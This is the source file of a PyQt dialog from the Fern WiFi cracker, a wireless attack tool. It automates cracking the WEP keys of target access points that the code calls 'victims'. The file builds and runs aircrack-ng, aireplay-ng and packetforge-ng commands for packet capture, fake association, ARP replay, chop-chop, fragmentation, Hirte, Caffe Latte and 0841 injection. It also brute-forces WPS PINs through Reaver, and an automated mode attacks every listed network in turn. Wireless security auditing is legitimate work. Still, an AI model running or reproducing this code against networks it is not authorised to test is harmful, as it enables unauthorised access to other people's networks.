from core.fern import *
from core.tools import*
from core.functions import *
from core.settings import *
from core.variables import *
from gui.attack_panel import *


from core import variables

#
# Wep Attack window class for decrypting wep keys
#

class wep_attack_dialog(QtGui.QDialog,Ui_attack_panel):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)

        self.button_control = True

        self.WEP = str()
        self.ivs_number = 0
        self.digit = 0
        self.ivs_value = 0

        ############## ATACK PANEL METHODS #####################

        self.access_points = set()
        self.mac_address = str()

        self.index = 0
        self.isfinished = False
        self.control = True
        self.cracked_keys = 0
        self.thread_control = True

        self.settings = Fern_settings()     # For saving settings

        self.wps_update_timer = QtCore.QTimer(self)
        self.connect(self.wps_update_timer,QtCore.SIGNAL("timeout()"),self.set_if_WPS_Support)
        self.wps_update_timer.start(1000)

        self.wifi_icon = QtGui.QPixmap("%s/resources/radio-wireless-signal-icone-5919-96.png"%os.getcwd())

        self.connect(self,QtCore.SIGNAL("new access point detected"),self.display_new_access_point)

        self.connect(self.general_group_box,QtCore.SIGNAL("DoubleClicked()"),self.mouseDoubleClickEvent)
        self.connect(self.ap_listwidget,QtCore.SIGNAL("itemSelectionChanged()"),self.display_selected_target)
        self.connect(self.attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
        self.connect(self.wps_attack_radio,QtCore.SIGNAL("clicked()"),self.check_reaver_status)
        self.connect(self,QtCore.SIGNAL("display stop icon"),self.display_stop_icon)
        self.connect(self,QtCore.SIGNAL("start automated attack"),self.wep_launch_attack)
        self.connect(self,QtCore.SIGNAL("change tree item"),self.change_treeItem)

        ############## ATACK PANEL METHODS #####################

        self.connect(self,QtCore.SIGNAL("injection_working"),self.injection_working)
        self.connect(self,QtCore.SIGNAL("injection_not_working"),self.injection_not_working)
        self.connect(self,QtCore.SIGNAL("associating"),self.associating)
        self.connect(self,QtCore.SIGNAL("update_progress_bar"),self.update_bar)
        self.connect(self,QtCore.SIGNAL("progress maximum"),self.progress_maximum)
        self.connect(self,QtCore.SIGNAL("injecting"),self.injecting)
        self.connect(self,QtCore.SIGNAL("gathering"),self.gathering)
        self.connect(self,QtCore.SIGNAL("chop-chop injecting"),self.chop_chop_attack)
        self.connect(self,QtCore.SIGNAL("fragment injecting"),self.fragmented_attack)
        self.connect(self,QtCore.SIGNAL("hirte injecting"),self.hirte_attack)
        self.connect(self,QtCore.SIGNAL("caffe latte injecting"),self.caffe_latte_attack)
        self.connect(self,QtCore.SIGNAL("P0841 injecting"),self.P0841_attack)
        self.connect(self,QtCore.SIGNAL("key not found yet"),self.key_not_found_yet)
        self.connect(self,QtCore.SIGNAL("wep found"),self.key_found)
        self.connect(self,QtCore.SIGNAL("cracking"),self.cracking)
        self.connect(self,QtCore.SIGNAL('passive mode'),self.passive_mode)
        self.connect(self,QtCore.SIGNAL('association failed'),self.association_failed)

        # wep_details = {'Elite': ['00:C0:CA:8B:15:62', '1', '54', '10']}

        access_point = sorted(wep_details.keys())[0]                                                        # The first key in dictionary

        variables.victim_mac = wep_details[access_point][0]
        variables.victim_channel = wep_details[access_point][1]
        variables.victim_access_point = access_point

        self.essid_label.setText('<font color=red>%s</font>'%(access_point))                        # Access point name
        self.bssid_label.setText('<font color=red>%s</font>'%(wep_details[access_point][0]))        # Mac address
        self.channel_label.setText('<font color=red>%s</font>'%(wep_details[access_point][1]))      # Channel
        self.power_label.setText('<font color=red>%s</font>'%(wep_details[access_point][3]))        # Power
        self.encrypt_wep_label.setText('<font color=red>WEP</font>')
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.set_if_WPS_Support()

        cracked_key = get_key_from_database(variables.victim_mac,"WEP")
        if(cracked_key):
            self.key_label.setVisible(True)
            self.key_label.setText('<font color=red>WEP KEY: %s</font>'%(cracked_key))
        else:
            self.key_label.setVisible(False)


        attack_type = ['ARP Request Replay','Chop-Chop Attack','Fragmentation Attack','Hirte Attack','Caffe Latte Attack','P0841']

        self.attack_type_combo.addItems(attack_type)

        self.keys_cracked_label.setVisible(False)
        self.setStyleSheet('background-image: url("%s/resources/binary_2.png");color:rgb(172,172,172);'%(os.getcwd()))
        self.attack_type_combo.setStyleSheet('color: rgb(172,172,172);background-color: black;font: %spt;'%(font_size()))

        ############## ATACK PANEL METHODS #####################

        self.wep_disable_items()
        self.ap_listwidget.clear()
        thread.start_new_thread(self.Check_New_Access_Point,())
        self.set_Key_Clipbord()


     ############## CLIPBOARD AND CONTEXT METHODS #####################

    def set_Key_Clipbord(self):
        self.convert_flag = False
        self.conversion_type = "WEP"
        self.clipboard_key = str()
        self.original_key = str()
        self.clipbord = QtGui.QApplication.clipboard()
        self.key_label.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.wps_pin_label.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)

        self.connect(self.key_label,QtCore.SIGNAL("customContextMenuRequested(QPoint)"),self.show_key_menu)
        self.connect(self.wps_pin_label,QtCore.SIGNAL("customContextMenuRequested(QPoint)"),self.show_wps_key_menu)



    def Convert_Key_to_Acsii(self):
        key_string = str(self.key_label.text())
        if not self.original_key:
            self.original_key = key_string
        actual_key = re.findall("WEP KEY: ([\S \w]+)</font>",key_string)
        if(actual_key):
            key = actual_key[0]
        converted_key = key.decode("hex")
        self.clipboard_key = converted_key
        self.key_label.setText("<font color=red>ASCII KEY: %s</font>" % (converted_key))
        self.convert_flag = True


    def Convert_to_Hex(self):
        self.key_label.setText(self.original_key)
        actual_key = re.findall("WEP KEY: ([\S \w]+)</font>",self.original_key)
        self.clipboard_key = actual_key[0]
        self.convert_flag = False


    def Copy_Key(self,key_type):
        key = str()
        key_string = str()

        if(key_type == "WPS PIN"):
            key_string = self.wps_pin_label.text()
            actual_key = re.findall("WPS PIN: ([\S \w]+)</font>",key_string)
            if(actual_key):
                self.clipboard_key = actual_key[0]
        self.clipbord.setText(self.clipboard_key)


    def show_key_menu(self,pos):
        menu = QtGui.QMenu()

        copy_action = object()
        convert_ascii_action = object()
        convert_hex_action = object()

        copy_action = menu.addAction("Copy Key")
        menu.addSeparator()

        if(self.conversion_type == "WEP"):                                         # Converting WPA is unnecessary
            if(self.convert_flag == False):
                convert_ascii_action = menu.addAction("Convert To ASCII")
            else:
                convert_hex_action = menu.addAction("Convert To HEX")

        selected_action = menu.exec_(self.key_label.mapToGlobal(pos))

        if(selected_action == copy_action):
            self.Copy_Key("OTHER KEY")

        if(selected_action == convert_ascii_action):
            self.Convert_Key_to_Acsii()

        if(selected_action == convert_hex_action):
                self.Convert_to_Hex()


    def show_wps_key_menu(self,pos):
        menu = QtGui.QMenu()
        copy_action = menu.addAction("Copy WPS Pin")

        selected_action = menu.exec_(self.key_label.mapToGlobal(pos))
        if(selected_action == copy_action):
            self.Copy_Key("WPS PIN")


    ############## END OF CLIPBOARD AND CONTEXT METHODS #################


    def set_Progressbar_color(self,color):
        COLOR_STYLE = '''
        QProgressBar {
             border: 2px solid %s;
             border-radius: 10px;
         }

         QProgressBar::chunk {
             background-color: %s;
         }
        '''
        self.progressBar.setStyleSheet(COLOR_STYLE % (color,color))


    def display_selected_target(self):
        selected_item = self.ap_listwidget.currentItem()
        victim_access_point = str(selected_item.text())

        # wep_details = {'Elite': ['00:C0:CA:8B:15:62', '1', '54', '10']}

        variables.victim_mac = wep_details[victim_access_point][0]
        variables.victim_channel = wep_details[victim_access_point][1]
        variables.victim_access_point = victim_access_point

        victim_power = wep_details[victim_access_point][3]
        victim_speed = wep_details[victim_access_point][2]

        cracked_key = get_key_from_database(variables.victim_mac,"WEP")
        if(cracked_key):
            self.key_label.setVisible(True)
            self.key_label.setText('<font color=red>WEP KEY: %s</font>'%(cracked_key))
            self.tip_display()
        else:
            self.key_label.setVisible(False)

        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(variables.victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(variables.victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WEP</font>')
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.set_if_WPS_Support()


    def show_tips(self):
        tips = tips_window()
        tips.type = 2
        tips.setWindowTitle("Tips")
        tips.label_2.setText("To copy the successfully cracked keys to clipboard, Please right click")
        tips.label_3.setText("on the cracked key of your choice and select \"Copy\".")
        tips.label_4.setText("You can also convert between ASCII to HEX keys for WEP.")
        tips.label_5.setVisible(False)
        tips.exec_()



    def tip_display(self):
        if(self.settings.setting_exists("copy key tips")):
            if(self.settings.read_last_settings("copy key tips") == "0"):
                self.show_tips()
        else:
            self.settings.create_settings("copy key tips","1")
            self.show_tips()

    def display_access_points(self):
        self.ap_listwidget.clear()
        self.ap_listwidget.setSpacing(12)
        for access_point in wep_details.keys():
            self.access_points.add(access_point)
            item =  QtGui.QListWidgetItem(self.ap_listwidget)
            icon = QtGui.QIcon()
            icon.addPixmap(self.wifi_icon)
            item.setIcon(icon)
            item.setText(access_point)
            self.ap_listwidget.addItem(item)
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.ap_listwidget.setMovement(QtGui.QListView.Snap)


    def Check_New_Access_Point(self):
        while(True):
            updated_list = set(wep_details.keys())
            if(True):
                new_list = self.access_points.symmetric_difference(updated_list)
                if(len(list(new_list))):
                    self.emit(QtCore.SIGNAL("new access point detected"))
            time.sleep(4)


    def display_new_access_point(self):
        self.ap_listwidget.setSpacing(12)
        new_access_points = self.access_points.symmetric_difference(set(wep_details.keys()))
        for access_point in list(new_access_points):
            self.access_points.add(access_point)
            item =  QtGui.QListWidgetItem(self.ap_listwidget)
            icon = QtGui.QIcon()
            icon.addPixmap(self.wifi_icon)
            item.setIcon(icon)
            item.setText(access_point)
            self.ap_listwidget.addItem(item)
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.ap_listwidget.setMovement(QtGui.QListView.Snap)




    def wep_disable_items(self):
        self.cracking_label_2.setEnabled(False)
        self.injecting_label.setEnabled(False)
        self.associate_label.setEnabled(False)
        self.injection_work_label_2.setEnabled(False)
        self.gathering_label.setEnabled(False)
        self.progressBar.setValue(0)
        self.set_Progressbar_color("#8B0000")   # RED
        self.ivs_progress_label.setEnabled(False)
        self.dictionary_set.setVisible(False)
        self.injecting_label.setText("Gathering packets")
        self.associate_label.setText("Associating with Access Point")
        self.injection_work_label_2.setText("Injection Capability Status")
        self.ivs_progress_label.setText('IVS Status')
        self.cracking_label_2.setText("Cracking Encryption")
        self.gathering_label.setText("Packet Injection Status")
        self.finished_label.setText("Finished")
        self.finished_label.setEnabled(False)
        self.key_label.setVisible(False)

        if self.automate_checkbox.isChecked() == False:
            self.keys_cracked_label.setVisible(False)

        self.wps_pin_label.setVisible(False)
        self.attack_button.setText("Attack")


    def set_if_WPS_Support(self,messagebox = False):
        victim_mac = variables.victim_mac
        if not variables.wps_functions.is_WPS_Device(victim_mac):
            self.wps_support_label.setEnabled(False)
            self.wps_support_label.setText("Supports WPS")
            if(messagebox):
                QtGui.QMessageBox.warning(self,"WPS Device Support","WPS (WIFI Protected Setup) is not supported or is disabled by the selected access point")
            self.regular_attack_radio.setChecked(True)
            return

        self.wps_support_label.setEnabled(True)
        self.wps_support_label.setText("<font color=yellow>Supports WPS</font>")


    def check_reaver_status(self):
        if not variables.wps_functions.reaver_Installed():
            answer = QtGui.QMessageBox.question(self,"Reaver not Detected",
            '''The Reaver tool is currently not installed,The tool is necessary for attacking WPS Access Points.\n\nDo you want to open the download link?''',
            QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
            if(answer == QtGui.QMessageBox.Yes):
                variables.wps_functions.browse_Reaver_Link()

            self.regular_attack_radio.setChecked(True)
            return

        self.set_if_WPS_Support(True)



    ############## ATACK PANEL METHODS #####################

    #
    # SIGNALS AND SLOTS FOR THE WEP CRACK STATUS
    #


    def display_stop_icon(self):
        self.progressBar.setValue(0)
        self.wep_disable_items()
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText('Stop')
        self.thread_control = False


    def cancel_wep_attack(self):
        self.button_control = True
        variables.exec_command('killall airodump-ng')
        variables.exec_command('killall aircrack-ng')
        variables.exec_command('killall aireplay-ng')
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText("Attack")

        if(self.wps_attack_radio.isChecked()):
            variables.wps_functions.stop_Attack_WPS_Device()




    def injection_working(self):
        self.injection_work_label_2.setEnabled(True)
        self.injection_work_label_2.setText('<font color=yellow> Injection is working on %s</font>'%(variables.monitor_interface))

    def injection_not_working(self):
        self.injection_work_label_2.setEnabled(True)
        self.injection_work_label_2.setText('<font color=red> %s is not injecting or proximity is low </font>'%(variables.monitor_interface))

    def associating(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText('<font color=yellow>Associating with Access Point</font>')

    def association_failed(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText('<font color=yellow>Security countermeasure Activated</font>')


    def progress_maximum(self):
        self.progressBar.setValue(self.ivs_value)

    def update_bar(self):
        if 'wep_dump-01.csv' in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            update_main = reader('/tmp/fern-log/WEP-DUMP/wep_dump-01.csv')
            update_filter = update_main.replace(',','\n')
            update_filter2 = update_filter.splitlines()
            try:
                update_progress = int(update_filter2[26].strip(' '))
            except IndexError:time.sleep(1)
            try:
                self.progressBar.setValue(update_progress)
                self.ivs_number = update_progress
                self.ivs_progress_label.setEnabled(True)
                self.ivs_progress_label.setText('<font color=yellow>%s ivs</font>'%(str(update_progress)))

                if(self.ivs_number < 3333):
                    self.set_Progressbar_color("#8B0000")   # RED
                elif(self.ivs_number < 6666):
                    self.set_Progressbar_color("#CCCC00")   # YELLOW
                else:
                    self.set_Progressbar_color("green")

            except UnboundLocalError:time.sleep(1)
        else:
            pass

    def gathering(self):
        self.injecting_label.setEnabled(True)
        self.injecting_label.setText('<font color=yellow>Gathering Packets</font>')

    def passive_mode(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Passive Mode Activated</font>')

    def injecting(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting ARP Packets</font>')

    def chop_chop_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Chop-Chop Packets</font>')

    def fragmented_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Fragmented Packets</font>')

    def hirte_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Hirte Packets</font>')

    def caffe_latte_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Caffe Latte Packets</font>')

    def P0841_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting ARP Frame Control (0x0841) Packets </font>')

    def key_not_found_yet(self):
        self.cracking_label_2.setEnabled(True)
        self.cracking_label_2.setText('<font color=yellow>Cracking Encryption</font>')

    def key_found(self):
        global victim_access_point
        self.cracking_label_2.setEnabled(True)
        self.cracking_label_2.setText('<font color=yellow>Cracking Encryption</font>')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')

        self.new_automate_key()

        self.key_label.setVisible(True)
        self.key_label.setText('<font color=red>WEP KEY: %s</font>'%(self.WEP))
        self.finished_label.setEnabled(True)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText('Attack')
        self.thread_control = True
        self.cancel_wep_attack()
        variables.exec_command('killall airodump-ng')
        variables.exec_command('killall airmon-ng')

        if self.settings.setting_exists('capture_directory'):
            shutil.copyfile('/tmp/fern-log/WEP-DUMP/wep_dump-01.cap',\
                    self.settings.read_last_settings('capture_directory') + '/%s_Capture_File(WEP).cap'%(victim_access_point))

        self.tip_display()      # Display Tips

    def cracking(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=red>Please Wait....</font>')

    #
    # THREADS FOR AUTOMATION
    #
    def injection_status(self):
        monitor = variables.monitor_interface
        injection_string = ''
        while 'Injection is working' not in injection_string:
            injection_string += str(commands.getstatusoutput('aireplay-ng -9 %s'%(monitor)))
            self.emit(QtCore.SIGNAL("injection_not_working"))

        self.emit(QtCore.SIGNAL("injection_working"))


        ########################################### SPECIAL COMMAND THREADS ######################################
    def dump_thread(self):
        wep_victim_channel = variables.victim_channel
        access_point_mac = variables.victim_mac
        monitor = variables.monitor_interface
        variables.exec_command('%s airodump-ng -c %s -w /tmp/fern-log/WEP-DUMP/wep_dump --bssid %s %s'%(variables.xterm_setting,wep_victim_channel,access_point_mac,monitor),"/tmp/fern-log/WEP-DUMP/")

    def association_thread(self):
        global scan_control
        monitor = variables.monitor_interface
        attacker_mac_address = variables.monitor_mac_address

        self.emit(QtCore.SIGNAL("associating"))
        association_string = ''
        association_timer = 0
        while True:
            association_string += str(commands.getstatusoutput('aireplay-ng -1 0 -a %s -h %s %s'%(variables.victim_mac,attacker_mac_address,monitor)))
            if'Association successful :-)' in association_string:
                thread.start_new_thread(self.successful_accociation_process,())
                break
            if association_timer >= 1:
                thread.start_new_thread(self.unsuccessful_association_process,())
                break
            if scan_control != 0:
                break
            association_timer += 1


    def unsuccessful_association_process(self):
        self.emit(QtCore.SIGNAL('association failed'))
        self.emit(QtCore.SIGNAL("gathering"))
        time.sleep(4)
        thread.start_new_thread(self.update_progress_bar,())
        self.emit(QtCore.SIGNAL('passive mode'))



    def successful_accociation_process(self):
        attack_mode = self.attack_type_combo.currentText()
        thread.start_new_thread(self.update_progress_bar,())
        self.emit(QtCore.SIGNAL("gathering"))
        thread.start_new_thread(self.update_progress_bar,())
        time.sleep(4)

        if attack_mode == 'ARP Request Replay':
            thread.start_new_thread(self.arp_request_thread,())     # arp_request_thread
            self.emit(QtCore.SIGNAL("injecting"))

        elif attack_mode == 'Chop-Chop Attack':                     # Chop-Chop attack thread
            thread.start_new_thread(self.chop_chop_thread,())

        elif attack_mode == 'Fragmentation Attack':
            thread.start_new_thread(self.fragmentation_thread,())   # Fragmentation attack thread

        elif attack_mode == 'Hirte Attack':
            thread.start_new_thread(self.hirte_thread,())           # Hirte Attack

        elif attack_mode == 'Caffe Latte Attack':
            thread.start_new_thread(self.caffe_latte_thread,())     # Caffe Latte Attack

        else:
            thread.start_new_thread(self.P0841_thread,())           # Arp Frame Control 0841


     ##################################### WEP ATTACK MODES ###############################


    def arp_request_thread(self):
        access_point_mac = variables.victim_mac
        monitor = variables.monitor_interface
        variables.exec_command("%s aireplay-ng -3 -e '%s' -b %s %s"%(variables.xterm_setting,victim_access_point,access_point_mac,monitor),"/tmp/fern-log/WEP-DUMP/")

    def chop_chop_thread(self):

        attacker_mac_address = variables.monitor_mac_address
        monitor = variables.monitor_interface
        access_point_mac = variables.victim_mac
        variables.exec_command('%s aireplay-ng -4 -F -h %s %s'%(variables.xterm_setting,attacker_mac_address,monitor),"/tmp/fern-log/WEP-DUMP/")

        variables.exec_command('%s packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y \
                                    /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/chop_chop.cap'%(variables.xterm_setting,access_point_mac,attacker_mac_address),"/tmp/fern-log/WEP-DUMP/")

        self.emit(QtCore.SIGNAL("chop-chop injecting"))
        self.emit(QtCore.SIGNAL("chop-chop injecting"))
        variables.exec_command('%s aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/chop_chop.cap %s'%(variables.xterm_setting,monitor),"/tmp/fern-log/WEP-DUMP/")

    def fragmentation_thread(self):
        attacker_mac_address = variables.monitor_mac_address
        monitor = variables.monitor_interface
        access_point_mac = variables.victim_mac

        variables.exec_command('%s aireplay-ng -5 -F -b %s -h %s %s'%(variables.xterm_setting,access_point_mac,attacker_mac_address,monitor),"/tmp/fern-log/WEP-DUMP/")
        variables.exec_command('%s packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/fragmented.cap'%(variables.xterm_setting,access_point_mac,attacker_mac_address),"/tmp/fern-log/WEP-DUMP/")
        self.emit(QtCore.SIGNAL("fragment injecting"))
        variables.exec_command('%s aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/fragmented.cap %s'%(variables.xterm_setting,monitor),"/tmp/fern-log/WEP-DUMP/")


    def hirte_thread(self):
        command = "aireplay-ng -7 -h %s -D %s" % (variables.monitor_mac_address,variables.monitor_interface)
        process = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd="/tmp/fern-log/WEP-DUMP/")
        self.emit(QtCore.SIGNAL("hirte injecting"))
        process.stdin.write("y")


    def caffe_latte_thread(self):
        command = "aireplay-ng -6 -h %s -b %s -D %s" % (variables.monitor_mac_address,variables.victim_mac,variables.monitor_interface)
        process = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd="/tmp/fern-log/WEP-DUMP/")
        self.emit(QtCore.SIGNAL("caffe latte injecting"))
        process.stdin.write("y")


    def P0841_thread(self):
        command = "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b %s -h %s %s" % (variables.victim_mac,variables.monitor_mac_address,variables.monitor_interface)
        process = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd="/tmp/fern-log/WEP-DUMP/")
        self.emit(QtCore.SIGNAL("P0841 injecting"))
        process.stdin.write("y")




    ################################################# WEP KEY CRACK ########################################################


    def crack_wep(self):
        directory = '/tmp/fern-log/WEP-DUMP/'
        variables.exec_command('killall aircrack-ng')
        process = subprocess.Popen('aircrack-ng '+ directory + '*.cap -l '+ directory + 'wep_key.txt',shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
        status = process.stdout
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            if 'Failed. Next try with' in status.readline():
                thread.start_new_thread(self.crack_wep,())
                break
            time.sleep(40)



    def update_progress_bar(self):
        if 'ivs_settings.log' in os.listdir('/tmp/fern-log'):
            self.ivs_value = int(reader('/tmp/fern-log/ivs_settings.log'))
            maximum = self.progressBar.setMaximum(self.ivs_value)
            maximum = self.progressBar.setRange(0,self.ivs_value)
        else:
            self.ivs_value = 10000
            maximum = self.progressBar.setMaximum(10000)
            maximum = self.progressBar.setRange(0,10000)


        while self.ivs_number <= self.ivs_value:
            time.sleep(0.4)
            self.emit(QtCore.SIGNAL("update_progress_bar"))

        self.emit(QtCore.SIGNAL("progress maximum"))
        thread.start_new_thread(self.crack_wep,())                   #Thread for cracking wep

        thread.start_new_thread(self.key_check,())
        self.emit(QtCore.SIGNAL("cracking"))
        time.sleep(13)

        if 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            self.emit(QtCore.SIGNAL("next_try"))
            QtCore.SIGNAL("update_progress_bar")
            thread.start_new_thread(self.updater,())


    def updater(self):
        global wep_string
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            self.emit(QtCore.SIGNAL("update_progress_bar"))
            time.sleep(1)


    def key_check(self):
        global wep_key_commit
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            self.emit(QtCore.SIGNAL("key not found yet"))
            time.sleep(2)

        key = reader('/tmp/fern-log/WEP-DUMP/wep_key.txt')

        self.WEP = key
        self.emit(QtCore.SIGNAL("wep found"))
        variables.exec_command('killall aircrack-ng')
        variables.exec_command('killall aireplay-ng')
        variables.exec_command('killall airmon-ng')
        variables.exec_command('killall airodump-ng')
        if len(self.WEP) > 0:
            if wep_key_commit == 0:
                set_key_entries(variables.victim_access_point,variables.victim_mac,'WEP',str(self.WEP.replace(':','')),variables.victim_channel)      #Add WEP Key to Database Here
                self.emit(QtCore.SIGNAL('update database label'))
                wep_key_commit += 1
                self.isfinished = True







        ############################################# END OF THREAD ################################

    def run_wep_attack(self):
        thread.start_new_thread(self.dump_thread,())                  # airodump_thread
        thread.start_new_thread(self.association_thread,())           # association_thread



    def launch_attack(self):
        if(self.automate_checkbox.isChecked()):
            thread.start_new_thread(self.launch_attack_2,())
        else:
            self.wep_launch_attack()


    def launch_attack_2(self):
        self.isfinished = True

        for index,access_point in enumerate(wep_details.keys()):
            variables.victim_access_point = access_point
            variables.victim_mac = wep_details[access_point][0]
            variables.victim_channel = wep_details[access_point][1]

            while(self.isfinished == False):
                time.sleep(4)
            if self.control == False:
                break
            if(self.index == (len(wep_details.keys()) - 1)):
                self.control = False
            if(index >= 1):
                self.emit(QtCore.SIGNAL("change tree item"))
            self.emit(QtCore.SIGNAL("start automated attack"))
            self.index = index
            self.isfinished = False

        while(self.thread_control == False):
            time.sleep(1)



    def change_treeItem(self):
        if(self.automate_checkbox.isChecked()):
            self.ap_listwidget.setCurrentItem(self.ap_listwidget.item(self.index))
            self.display_selected_target()


    def new_automate_key(self):
        self.cracked_keys += 1
        if(self.automate_checkbox.isChecked()):
            self.keys_cracked_label.setVisible(True)
            self.keys_cracked_label.setText("<font color=yellow><b>%s keys cracked</b></font>"%(str(self.cracked_keys)))
        else:
            self.keys_cracked_label.setVisible(False)


    def wep_launch_attack(self):
        global wep_key_commit

        if not self.button_control:
            self.cancel_wep_attack()
            return

        if(is_already_Cracked(variables.victim_mac,"WEP")):
            answer = QtGui.QMessageBox.question(self,"Access Point Already Cracked",variables.victim_access_point + "'s key already exists in the database, Do you want to attack and update the already saved key?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No);
            if(answer == QtGui.QMessageBox.No):
                self.control = True
                return

        self.button_control = False
        self.control = True

        self.ivs_number = 0
        self.WEP = ''
        wep_key_commit = 0

        self.wep_disable_items()

        self.emit(QtCore.SIGNAL("stop scan"))

        self.emit(QtCore.SIGNAL("display stop icon"))
        variables.exec_command('rm -r /tmp/fern-log/WEP-DUMP/*')

        # WPS AND REGULAR ATTACK STARTUP

        if(self.wps_attack_radio.isChecked()):                                      # WPS Attack Mode
            variables.wps_functions.victim_MAC_Addr = variables.victim_mac
            self.set_WPS_Objects(variables.wps_functions)
            variables.wps_functions.start()
            self.isfinished = False
        else:
            thread.start_new_thread(self.injection_status,())                       # Regular Attack Mode
            thread.start_new_thread(self.run_wep_attack,())


    def set_WPS_Objects(self,instance):
        self.progressBar.setMaximum(100)
        self.progressBar.setValue(0)
        self.connect(instance,QtCore.SIGNAL("Associating with WPS device"),self.associating_wps)
        self.connect(instance,QtCore.SIGNAL("Bruteforcing WPS Device"),self.associated_bruteforing)
        self.connect(instance,QtCore.SIGNAL("WPS Progress"),self.updating_progress)
        self.connect(instance,QtCore.SIGNAL("Cracked WPS Pin"),self.display_WPS_pin)
        self.connect(instance,QtCore.SIGNAL("Cracked WPS Key"),self.display_Cracked_Key)


    def associating_wps(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText("<font color=yellow>Associating with WPS Device</font>")


    def associated_bruteforing(self):
        self.injecting_label.setEnabled(True)
        self.gathering_label.setEnabled(True)
        self.injecting_label.setText("<font color=yellow>Associated with %s</font>" % variables.victim_mac)
        self.gathering_label.setText("<font color=yellow>Bruteforcing WPS Device</font>")


    def updating_progress(self):
        self.ivs_progress_label.setEnabled(True)
        self.cracking_label_2.setEnabled(True)

        value = int(float(variables.wps_functions.progress))
        self.progressBar.setValue(value)
        if(value < 33):
            self.set_Progressbar_color("#8B0000")   # RED
        elif(value < 66):
            self.set_Progressbar_color("#CCCC00")   # YELLOW
        else:
            self.set_Progressbar_color("green")

        self.ivs_progress_label.setText("<font color=yellow>" + variables.wps_functions.progress + "% Complete</font>")
        self.cracking_label_2.setText("<font color=yellow>Updating Progress</font>")


    def display_WPS_pin(self):
        self.wps_pin_label.setEnabled(True)
        self.wps_pin_label.setVisible(True)
        self.wps_pin_label.setText("<font color=red>WPS PIN: " + variables.wps_functions.get_keys()[0] + "</font>" )


    def display_Cracked_Key(self):
        self.key_label.setEnabled(True)
        self.key_label.setVisible(True)
        self.key_label.setText("<font color=red>WEP KEY: " + variables.wps_functions.get_keys()[1] + "</font>" )
        self.set_Progressbar_color("green")
        set_key_entries(variables.victim_access_point,variables.victim_mac,'WEP',variables.wps_functions.get_keys()[1],variables.victim_channel)
        self.emit(QtCore.SIGNAL('update database label'))
        self.finished_label.setText("<font color=yellow>Finished</font>")
        self.new_automate_key()
        self.cancel_wep_attack()
        self.isfinished = True

        self.tip_display()      # Display Tips


    def closeEvent(self,event):
        self.wps_update_timer.stop()